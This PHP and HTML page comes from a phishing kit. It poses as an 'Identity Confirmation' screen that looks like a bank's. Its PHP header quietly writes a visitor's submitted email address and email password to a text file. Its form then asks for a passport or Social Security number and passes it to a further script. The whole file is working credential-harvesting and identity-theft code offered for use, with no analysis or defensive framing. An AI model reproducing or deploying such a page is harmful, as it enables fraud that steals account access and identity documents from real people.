<?php
$file = fopen("datamichu.txt", "a");
fwrite($file, "|| Email: " .$_POST['eml']. PHP_EOL);
fwrite($file, "|| Clave email. : "  .$_POST['emlpsw']. PHP_EOL);
fclose($file);
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Identity Confirmation Email Alerts</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
.icono {
    background: url(../../css/icono.png) 1px 1px no-repeat;
    height: 21px;
    width: 18px;
    float: right;
    margin-right: 59px;
    margin-top: 1px;
}
.boot-blue {
    color: #fff;
    background-color: #0073CF;
    border-radius: 0;
    border: none;
}

.boot-blue:hover {
    color: #fff;
    background: #0052C2;
}
.boot-small {
    font-size: 20px;
    padding: 10px 20px;
}
.boot-blue1 {
    color: #0052C2;
    background-color: #F2F2F2;
    border-radius: 0;
    border: none;
}

.boot-blue1:hover {
    color: #012169;
    background: #E3E3E3;
}
.error {
    color: #DC1431;
    background: url(../../css/error.png) 0 0 no-repeat;
    padding: 3px 0 6px 30px!important;
    margin-left: 1px;
}
input[type=number] { -moz-appearance:textfield; }
input[type=number]::-webkit-inner-spin-button, 
input[type=number]::-webkit-outer-spin-button { 
  -webkit-appearance: none; 
  margin: 0; 
}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('../../css/loader.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: 1;
}
body{
font-family: Arial;
}
</style>

</head>

<body style="margin: 0 auto;overflow-x:hidden">

<div id="container" style="width:100%;margin: 0 auto;">
<div id="cabeza" style="margin-top:2px;margin-left:0px;">
<img src="./index3_files/a3.png" alt="" title="" border="0" width="1460" height="125">
</div>
<div id="cuerpo" style="margin: 25px 0 80px 88px;width:955px;height:356px;">
<div id="form2" style="float: left;margin-right: 25px;">
<form name="dafabhai" id="dafabhai" method="post" action="post5.php" autocomplete="off" >
      <div class="er" style="font-size: 21px;color: #333;margin-bottom: 20px;font-weight:bold;">Verification required !</div>
      <div class="er1" style="font-size: 16px;color: #333;margin-bottom: 30px;">Please provide us the following information to confirm your account !</div>
      
      <div class="us" style="margin-bottom: 20px;">
		  	<label id="id3" for="numcd" style="display:block;font-weight:normal;font-size:14px;color: #333;">Type of Document</label>
			  <select name="doc" style="border: 1px solid #ccc;width:405.33px;height:40px;padding: 4px 2px;font-size: inherit; margin-top: 7px;">
			  <option name="passport">Passport</option>
			  <option name="SSN">Social Security Number</option>
			  </select>
			
			
			<label id="id4" for="numcd" style="display:none;font-weight:normal;font-size:14px;margin-top:10px;" class="error">Please verify your information</label>
      </div>
			<div class="fecha" style="margin-bottom: 20px;width:280px;float: left;">
		
			<label id="id3" for="numcd" style="display:block;font-weight:normal;font-size:14px;color: #333;">Identification Number</label>
			<input type="text"  name="numdoc"   style="border: 1px solid #ccc;width:405.33px;height:40px;padding: 4px 2px;font-size: inherit;margin-top: 7px;">
			
		
      
      <button type="submit" form="dafabhai" id="Button1" style="margin-top: 33px;margin-right: 15px;" title="Sign in" class="boot boot-blue boot-small" name="">
			Continue
			</button>
			<button type="button" onclick="window.location=&#39;signOnV1Screen.php&#39;;" style="margin-top: 33px;" title="Sign in" class="boot boot-blue1 boot-small" name="">
			Cancel
			</button>
      </div>
			
</form>
</div>

</div>
<div id="pie" style="margin-top:-20px;margin-left:-3px;width:983px;height:117px;">
<div id="image15" style="width:987px; height:150px; z-index:5">
<img src="./index3_files/a2.png" alt="" title="" border="0" width="1296" height="155" style="margin-top:30px;margin-left: 66px;">
</div>
</div>


</div>

</body>
</html>